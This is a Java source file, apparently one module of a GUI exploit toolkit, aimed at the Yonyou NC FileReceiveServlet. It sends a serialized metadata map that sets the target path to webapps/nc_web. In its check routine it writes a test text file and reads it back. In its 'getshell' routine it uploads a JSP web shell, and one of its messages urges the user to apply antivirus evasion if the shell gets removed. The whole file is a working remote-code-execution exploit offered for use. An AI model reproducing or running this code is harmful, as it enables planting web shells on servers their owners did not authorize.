package Exp.OA.yongyou;

import Utilss.HttpTools;
import Utilss.Response;
import Utilss.shell;
import cn.hutool.core.util.StrUtil;
import core.Exploitlnterface;
import javafx.scene.control.TextArea;

import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

public class yongyou_nc_FileReceiveServlet implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        return att(url, textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Boolean shell = shell(url, textArea);
        return shell;
    }

    private Boolean att(String url,TextArea textArea){
        if (StrUtil.isBlank(url)){
            textArea.appendText("请填写URL");
            throw new RuntimeException("URL 不存在");
        }
        Response response = new Response(0, (String)null, (String)null, (String)null);
        try {
            HashMap<String,String> head = new HashMap<>();
            head.put("Content-Type","multipart/form-data;");
            HttpURLConnection coon = HttpTools.getCoon(url + "/servlet/FileReceiveServlet");
            coon.setRequestMethod("POST");
            coon.setDoOutput(true);
            coon.setDoInput(true);
            coon.setUseCaches(false);
            Iterator var5 = head.keySet().iterator();

            while(var5.hasNext()) {
                String key = (String)var5.next();
                coon.setRequestProperty(key, (String)head.get(key));
            }
            OutputStream outputStream = coon.getOutputStream();
            ObjectOutputStream out = new ObjectOutputStream(outputStream);
            Map<String, Object> metaInfo=new HashMap<String, Object>();
            metaInfo.put("TARGET_FILE_PATH","webapps/nc_web");
            metaInfo.put("FILE_NAME","nishizhu.txt");
            out.writeObject(metaInfo);
            outputStream.write(shell.test_payload.getBytes());
            out.flush();
            out.close();
            outputStream.close();
            response = HttpTools.getResponse(coon,"utf-8");

            Response get_res = HttpTools.get(url + "/nishizhu.txt", new HashMap<String, String>(), "utf-8");
            if(get_res.getCode() == 200 && get_res.getText().contains(shell.test_payload)){
                textArea.appendText("\n 反序列化漏洞存在 txt文件写入成功 \n" + url + "/nishizhu.txt");
                return true;
            }else {
                textArea.appendText("\n nc_FileReceiveServlet-RCE-漏洞不存在 (出现误报请联系作者)");
                return false;
            }

        } catch (Exception e) {
            textArea.appendText("\n nc_FileReceiveServlet-RCE-漏洞不存在 (出现误报请联系作者)");
            textArea.appendText("\n 连接异常！！！");
        }
        return false;
    }

    private Boolean shell(String url,TextArea textArea){
        Response response = new Response(0, (String)null, (String)null, (String)null);
        try {
            HashMap<String,String> head = new HashMap<>();
            head.put("Content-Type","multipart/form-data;");
            HttpURLConnection coon = HttpTools.getCoon(url + "/servlet/FileReceiveServlet");
            coon.setRequestMethod("POST");
            coon.setDoOutput(true);
            coon.setDoInput(true);
            coon.setUseCaches(false);
            Iterator var5 = head.keySet().iterator();

            while(var5.hasNext()) {
                String key = (String)var5.next();
                coon.setRequestProperty(key, (String)head.get(key));
            }
            OutputStream outputStream = coon.getOutputStream();
            ObjectOutputStream out = new ObjectOutputStream(outputStream);
            Map<String, Object> metaInfo=new HashMap<String, Object>();
            metaInfo.put("TARGET_FILE_PATH","webapps/nc_web");
            metaInfo.put("FILE_NAME","nishizhu.jsp");
            out.writeObject(metaInfo);
            outputStream.write(shell.readFile(shell.Jsppath).getBytes());
            out.flush();
            out.close();
            outputStream.close();
            response = HttpTools.getResponse(coon,"utf-8");

            Response get_res = HttpTools.get(url + "/nishizhu.jsp", new HashMap<String, String>(), "utf-8");
            if(get_res.getCode() == 200 && get_res.getText().contains(shell.test_payload)){
                textArea.appendText("\n 反序列化漏洞存在 shell文件写入成功 \n" + url + "/nishizhu.jsp");
                return true;
            }else {
                textArea.appendText("\n shell被查杀 请免杀！！！！！！！！");
                return false;
            }

        } catch (Exception e) {
            textArea.appendText("\n 连接异常！！！");
        }
        return false;
    }

}
